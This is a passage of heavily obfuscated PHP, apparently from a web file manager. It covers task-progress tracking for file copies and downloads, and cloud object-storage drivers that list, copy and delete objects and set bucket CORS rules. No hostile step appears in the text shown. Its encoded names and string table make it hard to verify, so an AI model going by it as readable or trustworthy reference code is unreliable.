$Ô†Íİæ[$¸ôÍßä½[1856]] = $Ô†Íİæ[$¸ôÍßä½[1855]] + $Ô†Íİæ[$¸ôÍßä½[1852]]; } } else { if ($Ô†Íİæ[$¸ôÍßä½[1859]] == $¸ôÍßä½[1424]) { if ($Ô†Íİæ[$¸ôÍßä½[1853]] == $¸ôÍßä½[1293]) { $Ô†Íİæ[$¸ôÍßä½[1856]] = $Ô†Íİæ[$¸ôÍßä½[1855]] + $Ô†Íİæ[$¸ôÍßä½[1852]] * 0.5; } else { if ($Ô†Íİæ[$¸ôÍßä½[1853]] == $¸ôÍßä½[110]) { $Ô†Íİæ[$¸ôÍßä½[1856]] = $Ô†Íİæ[$¸ôÍßä½[1855]] + $Ô†Íİæ[$¸ôÍßä½[1851]] * 0.5 + $Ô†Íİæ[$¸ôÍßä½[1852]] * 0.5; } } } } $Ô†Íİæ[$¸ôÍßä½[1799]] = $Ô†Íİæ[$¸ôÍßä½[1856]] / $Ô†Íİæ[$¸ôÍßä½[841]]; if ($Ô†Íİæ[$¸ôÍßä½[1799]] > 0) { $¶Ö‡­çÓ = timeFloat() - $Ô†Íİæ[$¸ôÍßä½[1801]] - $Ô†Íİæ[$¸ôÍßä½[1804]]; $Ô†Íİæ[$¸ôÍßä½[1805]] = $¶Ö‡­çÓ * (1 - $Ô†Íİæ[$¸ôÍßä½[1799]]) / $Ô†Íİæ[$¸ôÍßä½[1799]]; } } public function addPath($í”¾Ö¶è) { $÷Â’â¿ª =& $_SERVER[ùèÅ´Ãš]; if (!$í”¾Ö¶è) { return; } $ÜÇÏËİ =& $this->task; $›Øè°íâ = IO::infoWithChildren($í”¾Ö¶è); $ÖùØ«ãô = $ÜÇÏËİ[$÷Â’â¿ª[1860]] ? $ÜÇÏËİ[$÷Â’â¿ª[1860]][$÷Â’â¿ª[1861]] : 0; $ÜÇÏËİ[$÷Â’â¿ª[1860]] = array($÷Â’â¿ª[1861] => $ÖùØ«ãô + 1, $÷Â’â¿ª[496] => $›Øè°íâ[$÷Â’â¿ª[32]], $÷Â’â¿ª[87] => $›Øè°íâ[$÷Â’â¿ª[87]], $÷Â’â¿ª[586] => $›Øè°íâ[$÷Â’â¿ª[586]] ? $›Øè°íâ[$÷Â’â¿ª[586]] : $›Øè°íâ[$÷Â’â¿ª[87]]); if ($›Øè°íâ[$÷Â’â¿ª[33]] == $÷Â’â¿ª[233]) { $ÜÇÏËİ[$÷Â’â¿ª[1151]] += 1; } else { $ÜÇÏËİ[$÷Â’â¿ª[1151]] += $›Øè°íâ[$÷Â’â¿ª[82]][$÷Â’â¿ª[80]]; if ($›Øè°íâ[$÷Â’â¿ª[194]]) { $ÜÇÏËİ[$÷Â’â¿ª[1151]] += $›Øè°íâ[$÷Â’â¿ª[82]][$÷Â’â¿ª[81]] + 1; } } $ÜÇÏËİ[$÷Â’â¿ª[841]] += $›Øè°íâ[$÷Â’â¿ª[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ë‡”Òù§) { } public function sourceAddHashEnd($Å·Òº‡) { } public function sourceAddFileStart($Áó‰şšï) { $˜™åùÈ =& $_SERVER[ùèÅ´Ãš]; $Âó£áôò =& $this->task; $Âó£áôò[$˜™åùÈ[1851]] = $Áó‰şšï[$˜™åùÈ[79]]; $Âó£áôò[$˜™åùÈ[1849]] = $Áó‰şšï[$˜™åùÈ[32]]; $Âó£áôò[$˜™åùÈ[1153]] = $Áó‰şšï[$˜™åùÈ[32]]; $Âó£áôò[$˜™åùÈ[1862]] = $Áó‰şšï[$˜™åùÈ[87]]; $this->update(); } public function sourceAddFileEnd($í—’¼šó) { $×´ù¤¤î =& $_SERVER[ùèÅ´Ãš]; $ùñ¯©¿ =& $this->task; $ùñ¯©¿[$×´ù¤¤î[1856]] += $í—’¼šó[$×´ù¤¤î[79]]; $ùñ¯©¿[$×´ù¤¤î[1862]] = $í—’¼šó[$×´ù¤¤î[87]]; $this->update(1); } public function copyFileStart($¹ Ó°®Ö, $Æ¨áµÕ, $Şî¤¾˜, $’úŸÜ•, $ëÖÁÜ™É, $ÓòÒ­¯ğ) { $÷¦›º© =& $_SERVER[ùèÅ´Ãš]; $¿èÛäœ° = $ëÖÁÜ™É; if ($¿èÛäœ° == $GLOBALS[$÷¦›º©[1863]]) { $¿èÛäœ° = $GLOBALS[$÷¦›º©[1864]]; } $GLOBALS[$÷¦›º©[1864]] = $ëÖÁÜ™É; $GLOBALS[$÷¦›º©[1863]] = $ÓòÒ­¯ğ; $Š’®ø¸œ =& $this->task; $Š’®ø¸œ[$÷¦›º©[1849]] = $¿èÛäœ°; $Š’®ø¸œ[$÷¦›º©[1851]] = (int) $¹ Ó°®Ö->size($Æ¨áµÕ); $Š’®ø¸œ[$÷¦›º©[1852]] = 0; $Š’®ø¸œ[$÷¦›º©[1153]] = $÷¦›º©[12]; $Š’®ø¸œ[$÷¦›º©[1853]] = $÷¦›º©[12]; $Š’®ø¸œ[$÷¦›º©[1854]] = 0; $ô¡ë¾Óİ = $Š’®ø¸œ[$÷¦›º©[1851]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Š’®ø¸œ[$÷¦›º©[477]] . $÷¦›º©[1865]); if ($ô¡ë¾Óİ && file_exists(get_path_father($’úŸÜ•))) { Cache::set($Š’®ø¸œ[$÷¦›º©[477]] . $÷¦›º©[1865], $’úŸÜ•); $Š’®ø¸œ[$÷¦›º©[1822]] = array($÷¦›º©[1866], $÷¦›º©[1867]); } $this->update(0, $ô¡ë¾Óİ); } public static function updateCopyLocalFileSize($Ï€åÈš‘) { $Óóİ¨›İ =& $_SERVER[ùèÅ´Ãš]; $†ìÁ¯Ğ€ = Cache::get($Ï€åÈš‘[$Óóİ¨›İ[477]] . $Óóİ¨›İ[1865]); if (!$†ìÁ¯Ğ€ || !file_exists($†ìÁ¯Ğ€)) { return $Ï€åÈš‘; } $Ï€åÈš‘[$Óóİ¨›İ[1852]] = @filesize($†ìÁ¯Ğ€); $Ï€åÈš‘[$Óóİ¨›İ[1856]] += $Ï€åÈš‘[$Óóİ¨›İ[1852]]; self::updateTask($Ï€åÈš‘); return $Ï€åÈš‘; } public function copyFileEnd($¤îƒõöœ, $¡Ëö¾©õ, $ƒşÑÓšÛ, $ÅœÛ¬–, $Æ˜Î©ï†, $Î¿æÀ½ì) { $ÒÀ¦í†ò =& $_SERVER[ùèÅ´Ãš]; $µ¥„Ú =& $this->task; $µ¥„Ú[$ÒÀ¦í†ò[1852]] = $µ¥„Ú[$ÒÀ¦í†ò[1851]]; $µ¥„Ú[$ÒÀ¦í†ò[1853]] = $ÒÀ¦í†ò[12]; unset($µ¥„Ú[$ÒÀ¦í†ò[1822]]); if ($Æ˜Î©ï† == $µ¥„Ú[$ÒÀ¦í†ò[1849]]) { $µ¥„Ú[$ÒÀ¦í†ò[1855]] += $µ¥„Ú[$ÒÀ¦í†ò[1851]]; $µ¥„Ú[$ÒÀ¦í†ò[1856]] = $µ¥„Ú[$ÒÀ¦í†ò[1855]]; $²†¯Ö = 1; if (isset($µ¥„Ú[$ÒÀ¦í†ò[1862]]) && $µ¥„Ú[$ÒÀ¦í†ò[1862]] == $¡Ëö¾©õ) { $²†¯Ö = 0; } $this->update($²†¯Ö); } else { $this->update(); $µ¥„Ú[$ÒÀ¦í†ò[1852]] = 0; } Cache::remove($µ¥„Ú[$ÒÀ¦í†ò[477]] . $ÒÀ¦í†ò[1865]); self::log($ÒÀ¦í†ò[1868] . $¡Ëö¾©õ . $ÒÀ¦í†ò[73] . $ÅœÛ¬– . $ÒÀ¦í†ò[288] . $Æ˜Î©ï† . $ÒÀ¦í†ò[1869] . $µ¥„Ú[$ÒÀ¦í†ò[1849]]); } public function updateFileEnd($Ş•Ùï, $ßı¹­ã¦) { $¥Ä“ø¬¨ =& $_SERVER[ùèÅ´Ãš]; $÷ƒ¡ÃšÊ =& $this->task; $÷ƒ¡ÃšÊ[$¥Ä“ø¬¨[1849]] = $Ş•Ùï; $÷ƒ¡ÃšÊ[$¥Ä“ø¬¨[1851]] = $ßı¹­ã¦; $÷ƒ¡ÃšÊ[$¥Ä“ø¬¨[1855]] += $ßı¹­ã¦; $÷ƒ¡ÃšÊ[$¥Ä“ø¬¨[1856]] = $÷ƒ¡ÃšÊ[$¥Ä“ø¬¨[1855]]; $this->update(1); self::log($¥Ä“ø¬¨[1870] . $Ş•Ùï); } public function sourceModelCopy($â£ŒÍÇâ) { $ŒİºãÆ =& $_SERVER[ùèÅ´Ãš]; $•İÜÀ×• = $â£ŒÍÇâ[0]; $’õÅİ¶« = $â£ŒÍÇâ[1]; $ò÷”Òâğ =& $this->task; $this->sourceModelCopyFlag = !0; $±±ªø½Ê = 0; switch ($•İÜÀ×•) { case $ŒİºãÆ[642]: $±±ªø½Ê = 1; break; case $ŒİºãÆ[645]: $ò÷”Òâğ[$ŒİºãÆ[1849]] = $’õÅİ¶«[$ŒİºãÆ[32]]; break; case $ŒİºãÆ[647]: $±±ªø½Ê = intval($â£ŒÍÇâ[$ŒİºãÆ[458]] * 0.4); break; case $ŒİºãÆ[649]: $±±ªø½Ê = intval($â£ŒÍÇâ[$ŒİºãÆ[458]] * 0.2); break; case $ŒİºãÆ[651]: $±±ªø½Ê = intval($â£ŒÍÇâ[$ŒİºãÆ[458]] * 0.4); break; } $this->update($±±ªø½Ê); $this->sourceModelCopyFlag = !1; } public function sourceRemove($º¸íÌ†ª, $ÆíÕå) { $Ø“ÏØÏŠ =& $_SERVER[ùèÅ´Ãš]; $this->sourceModelCopyFlag = !0; $Ô¸µÒó = 1; if (isset($º¸íÌ†ª[$Ø“ÏØÏŠ[82]])) { $Ô¸µÒó = $º¸íÌ†ª[$Ø“ÏØÏŠ[82]][$Ø“ÏØÏŠ[80]]; $Ô¸µÒó = $Ô¸µÒó + $º¸íÌ†ª[$Ø“ÏØÏŠ[82]][$Ø“ÏØÏŠ[81]] + 1; } $this->update($Ô¸µÒó); $this->sourceModelCopyFlag = !1; } public function sourceMove($Áµ·ı…µ) { $this->sourceRemove($Áµ·ı…µ, !1); } public function curlProgress($øõºíéİ, $åÅ­¡Çù, $€Ë¡€ı, $Ú¼Ò’, $úÍÍ¿Ô“) { $Š¯˜¸Ãğ =& $_SERVER[ùèÅ´Ãš]; $¥½™ØÃ™ =& $this->task; if ($úÍÍ¿Ô“ > 0) { $¥½™ØÃ™[$Š¯˜¸Ãğ[1153]] = $Š¯˜¸Ãğ[1871]; $¥½™ØÃ™[$Š¯˜¸Ãğ[1853]] = $Š¯˜¸Ãğ[110]; if ($¥½™ØÃ™[$Š¯˜¸Ãğ[1851]]) { $¥½™ØÃ™[$Š¯˜¸Ãğ[1852]] = $úÍÍ¿Ô“; } if ($¥½™ØÃ™[$Š¯˜¸Ãğ[1854]]) { $¥½™ØÃ™[$Š¯˜¸Ãğ[1852]] = $úÍÍ¿Ô“ + $¥½™ØÃ™[$Š¯˜¸Ãğ[1854]]; } } else { if ($€Ë¡€ı > 0) { if ($¥½™ØÃ™[$Š¯˜¸Ãğ[1851]] == $åÅ­¡Çù) { $¥½™ØÃ™[$Š¯˜¸Ãğ[1852]] = $€Ë¡€ı; $¥½™ØÃ™[$Š¯˜¸Ãğ[1153]] = $Š¯˜¸Ãğ[1872]; $¥½™ØÃ™[$Š¯˜¸Ãğ[1853]] = $Š¯˜¸Ãğ[1293]; } } } $this->update(); } public function curlProgressStart($ÙÚ»–ğ”) { } public function curlProgressEnd($ˆœÉöˆ¥) { $ÏŠ‹ƒ† =& $_SERVER[ùèÅ´Ãš]; $ñ–ù×•¸ =& $this->task; $İ€­˜™‘ = curl_getinfo($ˆœÉöˆ¥); $Àñ ˆº = $İ€­˜™‘[$ÏŠ‹ƒ†[1873]]; if ($Àñ ˆº == -1) { $Àñ ˆº = $İ€­˜™‘[$ÏŠ‹ƒ†[1874]]; } if ($ñ–ù×•¸[$ÏŠ‹ƒ†[1853]] == $ÏŠ‹ƒ†[110] && $Àñ ˆº) { $ñ–ù×•¸[$ÏŠ‹ƒ†[1854]] += $Àñ ˆº; } $this->update(); } } goto BßîÀ‚ÆĞ“; b‹®šõóÜ‹: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($–Šƒ–ì) { parent::__construct($–Šƒ–ì); $this->setSignVersion($_SERVER[ùèÅ´Ãš][250]); } public function uploadFormData($°Ç½à¾Ó, $À§Îó·¨ = 3600) { return $this->uploadFormDataV2($°Ç½à¾Ó, $À§Îó·¨); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($·†Ì´æ˜) { parent::__construct(); include_once SDK_DIR . $_SERVER[ùèÅ´Ãš][1484]; $this->_init($·†Ì´æ˜); } public function _init($ç•ƒÁ¿²) { $±ƒğê´ =& $_SERVER[ùèÅ´Ãš]; $this->config = $ç•ƒÁ¿²; foreach ($ç•ƒÁ¿² as $º¯Ô½øÓ => $Ú…Áå§ı) { if (isset($this->{$º¯Ô½øÓ})) { $this->{$º¯Ô½øÓ} = $Ú…Áå§ı; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($±ƒğê´[1485] . LNG($±ƒğê´[1486])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ğÉ ş§· =& $_SERVER[ùèÅ´Ãš]; $îÄ†¿« = new OSS\Model\CorsConfig(); $Íâ¢ÔÚ† = new OSS\Model\CorsRule(); $Íâ¢ÔÚ†->addAllowedOrigin($ğÉ ş§·[1487]); $Íâ¢ÔÚ†->addAllowedMethod($ğÉ ş§·[1488]); $Íâ¢ÔÚ†->addAllowedMethod($ğÉ ş§·[1489]); $Íâ¢ÔÚ†->addAllowedMethod($ğÉ ş§·[1490]); $Íâ¢ÔÚ†->addAllowedMethod($ğÉ ş§·[1491]); $Íâ¢ÔÚ†->addAllowedMethod($ğÉ ş§·[165]); $Íâ¢ÔÚ†->setMaxAgeSeconds(600); $Íâ¢ÔÚ†->addExposeHeader($ğÉ ş§·[1492]); $Íâ¢ÔÚ†->addAllowedHeader($ğÉ ş§·[1487]); $îÄ†¿«->addRule($Íâ¢ÔÚ†); try { $this->client->putBucketCors($this->bucket, $îÄ†¿«); } catch (OSS\Core\OssException $ÀÙ¿˜Æˆ) { $this->writeLog(__FUNCTION__ . $ğÉ ş§·[215] . $ÀÙ¿˜Æˆ->getMessage()); return !1; } return !0; } public function getBucketCors() { $“âèËœ» =& $_SERVER[ùèÅ´Ãš]; $ëˆËû§› = null; try { $ëˆËû§› = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $å˜ã½¹ã) { $this->writeLog(__FUNCTION__ . $“âèËœ»[215] . $å˜ã½¹ã->getMessage()); return null; } if (!$ëˆËû§› || !($û–¼ıÄ‘ = $ëˆËû§›->getRules())) { return null; } $Éüô¥°µ = $û–¼ıÄ‘[0]->getAllowedOrigins(); $Õù¯²ãı = $û–¼ıÄ‘[0]->getAllowedMethods(); $»ş¬Â·‰ = $û–¼ıÄ‘[0]->getMaxAgeSeconds(); $”²¯˜ = $û–¼ıÄ‘[0]->getExposeHeaders(); $Ñ³µ˜§Â = $û–¼ıÄ‘[0]->getAllowedHeaders(); return array($“âèËœ»[221] => isset($Éüô¥°µ[0]) ? $Éüô¥°µ[0] : $“âèËœ»[12], $“âèËœ»[225] => $Õù¯²ãı, $“âèËœ»[1493] => $»ş¬Â·‰, $“âèËœ»[1494] => isset($”²¯˜[0]) ? $”²¯˜[0] : $“âèËœ»[12], $“âèËœ»[222] => isset($Ñ³µ˜§Â[0]) ? $Ñ³µ˜§Â[0] : $“âèËœ»[12]); } public function isBucketCors() { $ã¹Ç‡¯õ =& $_SERVER[ùèÅ´Ãš]; $ö­®½İ‰ = $this->getBucketCors(); if (!$ö­®½İ‰ || !is_array($ö­®½İ‰)) { return !1; } if ($ö­®½İ‰[$ã¹Ç‡¯õ[221]] != $ã¹Ç‡¯õ[223] || $ö­®½İ‰[$ã¹Ç‡¯õ[222]] != $ã¹Ç‡¯õ[223]) { return !1; } $Ä§æíÅœ = array_map($ã¹Ç‡¯õ[224], $ö­®½İ‰[$ã¹Ç‡¯õ[225]]); if (!is_array($Ä§æíÅœ)) { $Ä§æíÅœ = array(); } $¶½çÇñî = array($ã¹Ç‡¯õ[226], $ã¹Ç‡¯õ[227], $ã¹Ç‡¯õ[228], $ã¹Ç‡¯õ[229], $ã¹Ç‡¯õ[230]); $ø Ò‰š… = array_diff($¶½çÇñî, $Ä§æíÅœ); return empty($ø Ò‰š…); } public function mkfile($”®ëÚ»”, $†»ƒÇÌµ = '', $“Ö¡Ÿ†Ü = REPEAT_RENAME) { $Ò¾ÅıÑ = $this->setContent($”®ëÚ»”, $†»ƒÇÌµ); if ($Ò¾ÅıÑ !== !1) { return $this->getPathOuter($”®ëÚ»”); } return !1; } public function mkdir($Ä“³é¢¦, $Á‹‚ªÜØ = REPEAT_SKIP) { if ($Á‹‚ªÜØ && $this->_isFolder($Ä“³é¢¦)) { return $this->getPathOuter($Ä“³é¢¦); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ä“³é¢¦)); } catch (OSS\Core\OssException $£×‰‘ë) { $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][215] . $£×‰‘ë->getMessage()); return !1; } return $this->getPathOuter($Ä“³é¢¦); } private function fileList($ÅÕµÓ¤ô, $×¡¨‚ı± = '', $ù½ÒâÜ– = 0) { $ºŠø¤ı =& $_SERVER[ùèÅ´Ãš]; $ÅÕµÓ¤ô = trim($ÅÕµÓ¤ô, $ºŠø¤ı[8]); $†€Â¨À¥ = empty($ÅÕµÓ¤ô) && $ÅÕµÓ¤ô !== $ºŠø¤ı[231] ? $ºŠø¤ı[12] : $ÅÕµÓ¤ô . $ºŠø¤ı[8]; $ İ¼ÉµŠ = $ºŠø¤ı[12]; $†Æ©Å‹œ = 1000; $ÊÚà¤ü = $À©¨ÎÇÑ = array(); while (!0) { check_abort(); $•àçÜáË = array($ºŠø¤ı[1495] => $×¡¨‚ı±, $ºŠø¤ı[1496] => $†€Â¨À¥, $ºŠø¤ı[1497] => $†Æ©Å‹œ, $ºŠø¤ı[1498] => $ İ¼ÉµŠ); try { $¼ŸÏãĞ = $this->client->listObjects($this->bucket, $•àçÜáË); } catch (OSS\Core\OssException $ÖÉ˜º©æ) { $this->writeLog(__FUNCTION__ . $ºŠø¤ı[215] . $ÖÉ˜º©æ->getMessage()); break; } $ İ¼ÉµŠ = $¼ŸÏãĞ->getNextMarker(); $Ø„…ŞÒÁ = $¼ŸÏãĞ->getObjectList(); $Æğ¶Ôßµ = $¼ŸÏãĞ->getPrefixList(); foreach ($Ø„…ŞÒÁ as $¦ƒíØàÌ) { if ($¦ƒíØàÌ->getKey() == $†€Â¨À¥) { continue; } $°…Ê­ = $¦ƒíØàÌ->getKey(); $×ÖÈ§« = $¦ƒíØàÌ->getSize(); $¤‹Üâ‹ = $¦ƒíØàÌ->getLastModified(); $œ€çøÒ = trim($¦ƒíØàÌ->getETag(), $ºŠø¤ı[121]); $¼¤›ë½¯ = $ù½ÒâÜ– ? array($ºŠø¤ı[32] => $°…Ê­, $ºŠø¤ı[79] => $×ÖÈ§«, $ºŠø¤ı[207] => strtotime($¤‹Üâ‹), $ºŠø¤ı[1499] => $œ€çøÒ) : $°…Ê­; $Õ×¾š³ = $×ÖÈ§« == 0 && substr($°…Ê­, strlen($°…Ê­) - 1, 1) == $ºŠø¤ı[8] ? !0 : !1; $ÍÌ£ƒ›à = array($ºŠø¤ı[79] => $×ÖÈ§«, $ºŠø¤ı[1500] => $×ÖÈ§«, $ºŠø¤ı[88] => strtotime($¤‹Üâ‹), $ºŠø¤ı[1501] => $¤‹Üâ‹, $ºŠø¤ı[1499] => $œ€çøÒ); $this->cacheMethodInfoSet($°…Ê­, $Õ×¾š³, $ÍÌ£ƒ›à); if ($Õ×¾š³) { $ÊÚà¤ü[] = $°…Ê­; continue; } $À©¨ÎÇÑ[] = $¼¤›ë½¯; } foreach ($Æğ¶Ôßµ as $íÇÂªƒ) { $ÊÚà¤ü[] = $íÇÂªƒ->getPrefix(); $this->cacheMethodInfoSet($íÇÂªƒ->getPrefix(), !0); } if ($ İ¼ÉµŠ === $ºŠø¤ı[12]) { break; } } $this->cacheMethodInfoSet($ÅÕµÓ¤ô, !0); return array($ºŠø¤ı[85] => $ÊÚà¤ü, $ºŠø¤ı[86] => $À©¨ÎÇÑ); } public function listObject($‚…¤Ù², $¬×ß• = '') { $ş–İ™¾ =& $_SERVER[ùèÅ´Ãš]; $‚…¤Ù² = trim($‚…¤Ù², $ş–İ™¾[8]); $ü–úı¼µ = empty($‚…¤Ù²) && $‚…¤Ù² !== $ş–İ™¾[231] ? $ş–İ™¾[12] : $‚…¤Ù² . $ş–İ™¾[8]; $Ã•ö¸â = $ş–İ™¾[12]; $ä¹æÅ”³ = 1000; $Áìò½¡Á = $ü¿Ü¡® = array(); while (!0) { check_abort(); $‡¨‰Ûá = array($ş–İ™¾[1495] => $¬×ß•, $ş–İ™¾[1496] => $ü–úı¼µ, $ş–İ™¾[1497] => $ä¹æÅ”³, $ş–İ™¾[1498] => $Ã•ö¸â); try { $áœ±±ğÀ = $this->client->listObjects($this->bucket, $‡¨‰Ûá); } catch (OSS\Core\OssException $Š»ê•°Â) { $this->writeLog(__FUNCTION__ . $ş–İ™¾[215] . $Š»ê•°Â->getMessage()); break; } $Ã•ö¸â = $áœ±±ğÀ->getNextMarker(); $ÂÆ¨—ö = $áœ±±ğÀ->getObjectList(); foreach ($ÂÆ¨—ö as $ÎñóÔ‰) { if ($ÎñóÔ‰->getKey() == $ü–úı¼µ) { continue; } $·İéã¹¾ = $ÎñóÔ‰->getKey(); $‘‹Òô¥¹ = $ÎñóÔ‰->getSize(); $ş³Ù›øç = $‘‹Òô¥¹ == 0 && substr($·İéã¹¾, strlen($·İéã¹¾) - 1, 1) == $ş–İ™¾[8] ? !0 : !1; if ($ş³Ù›øç) { continue; } $ü¿Ü¡®[] = $‘‹Òô¥¹ . $ş–İ™¾[215] . $·İéã¹¾; } if ($Ã•ö¸â === $ş–İ™¾[12]) { break; } } return array($ş–İ™¾[85] => $Áìò½¡Á, $ş–İ™¾[86] => $ü¿Ü¡®); } public function copyFile($¿Æİ¶š, $‹†‘¼é‚) { $Ç€íÇ ± = $this->size($¿Æİ¶š); if ($Ç€íÇ ± < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¿Æİ¶š, $this->bucket, $this->pathEncode($‹†‘¼é‚)); } catch (OSS\Core\OssException $íÊÓİ«ß) { $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][215] . $íÊÓİ«ß->getMessage()); return !1; } return $this->getPathOuter($‹†‘¼é‚); } $øìá¤ß› = $this->multiCopyObject($¿Æİ¶š, $‹†‘¼é‚, $Ç€íÇ ±); return $øìá¤ß› ? $this->getPathOuter($‹†‘¼é‚) : !1; } private function multiCopyObject($Ø¸‘Æå, $Ğñ¤£‹, $‹ÜÊ’) { $øäÔÜË½ =& $_SERVER[ùèÅ´Ãš]; try { $™ü•ëÙÜ = array(); if ($ÃÛÔ¡Ê¾ = $this->hashMd5($Ø¸‘Æå)) { $™ü•ëÙÜ = array(OSS\OssClient::OSS_HEADERS => array($øäÔÜË½[1502] => $ÃÛÔ¡Ê¾)); } $ªß•¹·¥ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ğñ¤£‹), $™ü•ëÙÜ); $ûÛùÏ¾ = 1; $™¼èƒ¹à = 0; $­÷âŒœÆ = array(); $Æ§õøÉ— = 1024 * 1024 * 10; $Á¼ø¹å = $this->client->generateMultiuploadParts($‹ÜÊ’, $Æ§õøÉ—); foreach ($Á¼ø¹å as $âò‚‹õ÷ => $à¼üæÖ) { $ûğ€€è“ = $™¼èƒ¹à + (int) $à¼üæÖ[$øäÔÜË½[1503]]; $šÙÎ‘í = (int) $à¼üæÖ[$øäÔÜË½[414]] + $ûğ€€è“ - 1; $æìöÃ¾ = array($øäÔÜË½[167] => $ûğ€€è“, $øäÔÜË½[168] => $šÙÎ‘í); $­÷âŒœÆ[] = $this->client->uploadPartCopy($this->bucket, $Ø¸‘Æå, $this->bucket, $this->pathEncode($Ğñ¤£‹), $ûÛùÏ¾, $ªß•¹·¥, $æìöÃ¾); $ûÛùÏ¾ = $ûÛùÏ¾ + 1; } $ö¯İŞÑ = array(); foreach ($­÷âŒœÆ as $âò‚‹õ÷ => $ªµÄïª°) { $ö¯İŞÑ[] = array($øäÔÜË½[300] => $âò‚‹õ÷ + 1, $øäÔÜË½[301] => $ªµÄïª°); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ğñ¤£‹), $ªß•¹·¥, $ö¯İŞÑ); } catch (OSS\Core\OssException $ƒ†Ğİ½ø) { $this->writeLog(__FUNCTION__ . $øäÔÜË½[215] . $ƒ†Ğİ½ø->getMessage()); return !1; } return !0; } public function moveFile($º·í, $çë‹õ¾’) { if ($this->copyFile($º·í, $çë‹õ¾’)) { $this->remove($º·í); return $this->getPathOuter($çë‹õ¾’); } return !1; } public function delFile($ç‡ÏñŒè) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ç‡ÏñŒè)); } catch (OSS\Core\OssException $›†È¢‡­) { $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][215] . $›†È¢‡­->getMessage()); return !1; } return !0; } public function delFolder($ÒÔüÙ´ò) { $°ñİ¯¡º =& $_SERVER[ùèÅ´Ãš]; if (!$this->exist($ÒÔüÙ´ò)) { return !0; } $this->listItemCache = !1; $ŠÊŸË³ = $this->fileList($ÒÔüÙ´ò); $this->listItemCache = !0; $î©ûê«© = trim($ÒÔüÙ´ò, $°ñİ¯¡º[8]) . $°ñİ¯¡º[8]; if (!empty($ÒÔüÙ´ò) && $ÒÔüÙ´ò !== $°ñİ¯¡º[231] && !in_array($î©ûê«©, $ŠÊŸË³[$°ñİ¯¡º[85]])) { $ŠÊŸË³[$°ñİ¯¡º[85]][] = $î©ûê«©; } $¯ÜÓüˆ¨ = $this->delByBatch($ŠÊŸË³[$°ñİ¯¡º[86]]); if (!$¯ÜÓüˆ¨) { return !1; } $¯ÜÓüˆ¨ = $this->delByBatch($ŠÊŸË³[$°ñİ¯¡º[85]]); if (!$¯ÜÓüˆ¨) { return !1; } return $this->delFile($î©ûê«©); } private function delByBatch($¾Ú´şÉ) { foreach (array_chunk($¾Ú´şÉ, 1000) as $ÖÆ‘‘¯û) { try { $this->client->deleteObjects($this->bucket, $ÖÆ‘‘¯û); } catch (OSS\Core\OssException $Íóç—÷±) { $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][215] . $Íóç—÷±->getMessage()); return !1; } } return !0; } public function rename($‚‰Ÿ¯­Ö, $¦Şğæ©) { return $this->renameObject($‚‰Ÿ¯­Ö, $¦Şğæ©); } private function fileInfo($ùìĞµ˜æ, $©öõ˜€ = false, $¦ô²³Ù£ = array()) { $ÕÁÄ´´ì =& $_SERVER[ùèÅ´Ãš]; $ê—Îµ€ = array($ÕÁÄ´´ì[32] => $this->pathThis($ùìĞµ˜æ), $ÕÁÄ´´ì[87] => $this->getPathOuter($ùìĞµ˜æ), $ÕÁÄ´´ì[33] => $ÕÁÄ´´ì[233], $ÕÁÄ´´ì[79] => isset($¦ô²³Ù£[$ÕÁÄ´´ì[79]]) ? $¦ô²³Ù£[$ÕÁÄ´´ì[79]] : 0, $ÕÁÄ´´ì[169] => $this->ext($ùìĞµ˜æ)); if ($©öõ˜€) { return $ê—Îµ€; } $ê—Îµ€[$ÕÁÄ´´ì[234]] = $ê—Îµ€[$ÕÁÄ´´ì[88]] = 0; $ê—Îµ€[$ÕÁÄ´´ì[235]] = $ê—Îµ€[$ÕÁÄ´´ì[236]] = !0; if (empty($¦ô²³Ù£)) { $ª™óñ²– = $this->objectMeta($ùìĞµ˜æ); if (!$ª™óñ²–) { return $ê—Îµ€; } $¦ô²³Ù£ = array($ÕÁÄ´´ì[88] => strtotime($ª™óñ²–[$ÕÁÄ´´ì[1501]]), $ÕÁÄ´´ì[79] => $ª™óñ²–[$ÕÁÄ´´ì[1500]] + 0, $ÕÁÄ´´ì[1499] => $ª™óñ²–[$ÕÁÄ´´ì[1499]]); } if (isset($¦ô²³Ù£[$ÕÁÄ´´ì[1499]]) && $¦ô²³Ù£[$ÕÁÄ´´ì[1499]]) { $ê—Îµ€[$ÕÁÄ´´ì[238]] = trim($¦ô²³Ù£[$ÕÁÄ´´ì[1499]], $ÕÁÄ´´ì[121]); } if (isset($¦ô²³Ù£[$ÕÁÄ´´ì[79]])) { $ê—Îµ€[$ÕÁÄ´´ì[79]] = $¦ô²³Ù£[$ÕÁÄ´´ì[79]]; } if (isset($¦ô²³Ù£[$ÕÁÄ´´ì[88]])) { $ê—Îµ€[$ÕÁÄ´´ì[88]] = $¦ô²³Ù£[$ÕÁÄ´´ì[88]]; } if (isset($¦ô²³Ù£[$ÕÁÄ´´ì[207]]) && !trim($ê—Îµ€[$ÕÁÄ´´ì[88]])) { $ê—Îµ€[$ÕÁÄ´´ì[88]] = $¦ô²³Ù£[$ÕÁÄ´´ì[207]]; } return $ê—Îµ€; } private function folderInfo($›Ö¼Êç¼, $¸ğ¤Èñ = false, $¡˜ƒ¾» = array()) { $­ÑÌ½¨ =& 